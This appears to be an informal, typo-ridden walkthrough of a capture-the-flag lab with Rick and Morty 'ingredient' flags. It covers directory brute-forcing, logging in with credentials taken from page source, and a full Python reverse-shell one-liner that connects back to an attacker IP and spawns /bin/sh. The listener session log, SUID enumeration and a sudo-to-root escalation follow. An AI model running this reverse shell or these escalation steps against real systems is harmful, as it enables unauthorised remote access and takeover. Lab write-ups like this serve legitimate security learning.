"to check directories and specififque extentions "
gobuster dir -u http://10.10.31.155 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,sh,txt,cgi,py,html,css,js

"we found login in http://10.10.31.155/login , username found in source code of first index page , passwd found in the src of the robot.txt page so they worked "


///// first ingrediant ////
we used the cmnd less with the name of the file in the command line so that it works "less Sup3rS3cretPickl3Ingred.txt"
 which gave us the first ingrediant whcih is" mr. meeseek hair" 

we can also use pattern like "grep . fromfile " or we can use shell "while read line;do echo $line;done < filename"

"second ingrediant "

The hacker (or user) tried to decode a base64-encoded string multiple times, hoping to uncover some hidden message

echo Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== | base64 -d

What is Base64?

Base64 is a binary-to-text encoding scheme used to represent binary data in an ASCII string format. It is commonly used to encode binary files (such as images, videos, or executable files) into a text format that can be easily transmitted over text-based protocols like email (MIME), HTML, or URL parameters.

we will  try commands to see if they are able to be executed on the cmnd line and  it seems that this does [python3 -c print"('hello')"]

The command python3 -c "print('hello')" does the following:

    python3: This specifies that you want to use Python 3 to run the command.
    -c: This option tells Python to execute the command provided as a string inside the quotes (" ").
    "print('hello')": This is the Python code being executed. It simply calls the print() function to display the string hello.
    
   so lets visit [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet] for a reverse shell with  python 
   
   
   finally we got  a reverse shelll from that website 
   
   {\\\\\\
   
   python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.21.132.238",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
   
   makkee shure to chek the page src other wwise u will fail to copy all of thee code
   
   ///////}
   
   when we get  the reverse shell , we will usee thiss tto kinnda stabilise tthee sheell 
   {////
   this is the repository 
   https://github.com/johnHammond/poor-mans-pentest
   
   1. Upgrade to a TTY Shell

Once you have a basic shell, run:

python3 -c 'import pty; pty.spawn("/bin/bash")'


2. Export a Proper Terminal

Set the terminal type to avoid display issues:

export TERM=xterm


3. Enable Job Control

Press Ctrl+Z to suspend the shell. Then, run:

stty raw -echo; fg


    
    ////}
    
    
    this is the second flag we foundd it without sstabiliising  the shell └
    
    |||||||||||||||||||||||||
    ─$  nc -lvp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.104.34 52676
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn(\"/bin/bash\")'
  File "<string>", line 1
    import pty; pty.spawn(\"/bin/bash\")
                                       ^
SyntaxError: unexpected character after line continuation character
$ cd /
$ pwd
/
$ cd homee
/bin/sh: 4: cd: can't cd to homee
$ cd home
$ lss
/bin/sh: 6: lss: not found
$ ls
rick
ubuntu
$ cd rick
$ ls
second ingredients
$ cd second ingredients
/bin/sh: 10: cd: can't cd to second
$ cat second ingredients 
cat: second: No such file or directory
cat: ingredients: No such file or directory
$ ls -l
total 4
-rwxrwxrwx 1 root root 13 Feb 10  2019 second ingredients
$ cat second\ ingredients
1 jerry tear
$ 

\\\\\\\\\\\\\\\\\\\\\}




now 

|\\\\\\\\\\\ thhe third ingredient \\\\\\\\\\\\\\\\\\

now time to escalade priviliges 
lets use this 
[find / -perm -4000 2>/dev/null]


find / → Searches the entire filesystem (/).
-perm -4000 → Finds files with the SUID (Set User ID) permission set (4000 means the file runs with the owner's privileges).
2>/dev/null → Redirects error messages (like "Permission denied") to /dev/null, so they don't clutter the output.


now lets sseee our userr priviliges 
by tapping [sudo -l]

What does sudo -l do?

    This command lists the sudo privileges for the current user.
    It shows which commands you can run with sudo without needing a password.

its says  no passwd $ $ sudo -l
Matching Defaults entries for www-data on ip-10-10-104-34:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-104-34:
    (ALL) NOPASSWD: ALL
$ 
 lets try now to be root 
 
 using sudo su 
 

